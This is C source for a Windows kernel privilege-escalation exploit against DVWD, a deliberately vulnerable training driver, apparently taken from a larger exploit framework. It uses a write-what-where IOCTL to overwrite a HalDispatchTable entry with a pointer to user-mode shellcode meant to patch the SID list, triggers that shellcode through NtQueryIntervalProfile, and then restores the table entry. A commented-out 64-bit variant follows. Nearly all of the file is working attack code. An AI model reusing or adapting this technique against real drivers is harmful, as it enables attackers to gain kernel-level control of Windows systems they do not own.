

#define DEVICEIO_DVWD_OVERWRITE		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define DEVICEIO_DVWD_STORE			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

typedef struct _ARBITRARY_OVERWRITE_STRUCT
{
    PVOID StorePtr;
    ULONG Size;
} ARBITRARY_OVERWRITE_STRUCT, *PARBITRARY_OVERWRITE_STRUCT;

typedef struct _ARBITRARY_OVERWRITE_STRUCT64
{
    PVOID64 StorePtr;
    ULONG64 Size;
} ARBITRARY_OVERWRITE_STRUCT64, *PARBITRARY_OVERWRITE_STRUCT64;


ULONG_PTR __stdcall UserShellcodeSIDListPatchUser4Args(DWORD Arg1, DWORD Arg2, DWORD Arg3, DWORD Arg4)
{
    UNUSED_ARG(Arg1);
    UNUSED_ARG(Arg2);
    UNUSED_ARG(Arg3);
    UNUSED_ARG(Arg4);

    exploit_payload_ep(gPayload, kernelBase);

    return 0;
}

typedef NTSTATUS (__stdcall *_NtQueryIntervalProfile)(DWORD ProfileSource, PULONG Interval);

int exploit_fire_test()
{
    HANDLE hFile;
    BOOL ret;
    DWORD dwReturn;
    ARBITRARY_OVERWRITE_STRUCT overwrite;
    ULONG dummy=0;
    ULONG_PTR HalDispatchTableTarget;
    _NtQueryIntervalProfile NtQueryIntervalProfile;

    HalDispatchTableTarget = HalDispatchTable + (g_pSysInfo->isWow64 ? 8 : 4);

    NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(_GetModuleHandleW(L"ntdll.dll"), "NtQueryIntervalProfile");

    hFile = _CreateFileW(L"\\\\.\\DVWD", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        INLOG("Can't open DVWD driver\n",0);
        return ERROR_EXPLOIT;
    }

    overwrite.Size = (g_pSysInfo->isWow64 ? 8 : 4);
    overwrite.StorePtr = (PVOID)UserShellcodeSIDListPatchUser4Args;
    ret = _DeviceIoControl(hFile, DEVICEIO_DVWD_STORE, &overwrite, 0, NULL, 0, &dwReturn, NULL);

    overwrite.Size = (g_pSysInfo->isWow64 ? 8 : 4);
    overwrite.StorePtr = (PVOID)HalDispatchTableTarget;
    ret = _DeviceIoControl(hFile, DEVICEIO_DVWD_OVERWRITE, &overwrite, 0, NULL, 0, &dwReturn, NULL);

    NtQueryIntervalProfile(2, &dummy);

    // Восстанавливаем предыдущее значение, нами затёртое... :)
    ret = _DeviceIoControl(hFile, DEVICEIO_DVWD_OVERWRITE, &overwrite, 0, NULL, 0, &dwReturn, NULL);

    _CloseHandle(hFile);

    return (ret ? ERROR_NONE : ERROR_EXPLOIT);
}
// 
// __declspec(naked) ULONG_PTR UserShellcodeSIDListPatchUser4Args64(ULONG64 Arg1, ULONG64 Arg2, ULONG64 Arg3, ULONG64 Arg4)
// {
//     UNUSED_ARG(Arg1);
//     UNUSED_ARG(Arg2);
//     UNUSED_ARG(Arg3);
//     UNUSED_ARG(Arg4);
// 
//     __asm
//     {
//         int 3;
//         ret 8;
//     }
// }
// 
// int ExploitDrvTest64()
// {
//     HANDLE hFile;
//     BOOL ret;
//     DWORD dwReturn;
//     ARBITRARY_OVERWRITE_STRUCT64 overwrite;
//     ULONG dummy=0;
//     _NtQueryIntervalProfile NtQueryIntervalProfile;
// 
//     INLOG("ExploitDrvTest64 start", 0);
// 
//     NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(_GetModuleHandleW(L"ntdll.dll"), "NtQueryIntervalProfile");
// 
//     hFile = _CreateFileW(L"\\\\.\\DVWD", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
// 
//     if (hFile == INVALID_HANDLE_VALUE) {
//         INLOG("Can't open DVWD driver\n",0);
//         return 1;
//     }
// 
//     overwrite.Size = 8;
//     overwrite.StorePtr = (PVOID64)UserShellcodeSIDListPatchUser4Args64;
//     ret = _DeviceIoControl(hFile, DEVICEIO_DVWD_STORE, &overwrite, 0, NULL, 0, &dwReturn, NULL);
// 
//     INLOG("DeviceIoControl driver\n",ret);
// 
//     overwrite.Size = 8;
//     overwrite.StorePtr = 0;
//     ret = _DeviceIoControl(hFile, DEVICEIO_DVWD_OVERWRITE, &overwrite, 0, NULL, 0, &dwReturn, NULL);
// 
//     INLOG("DeviceIoControl driver\n",ret);
// 
//     NtQueryIntervalProfile(2, &dummy);
// 
//     // Восстанавливаем предыдущее значение, нами затёртое... :)
//     ret = _DeviceIoControl(hFile, DEVICEIO_DVWD_OVERWRITE, &overwrite, 0, NULL, 0, &dwReturn, NULL);
// 
//     INLOG("DeviceIoControl driver\n",ret);
// 
//     _CloseHandle(hFile);
// 
//     return (ret ? 0 : 1);
// }
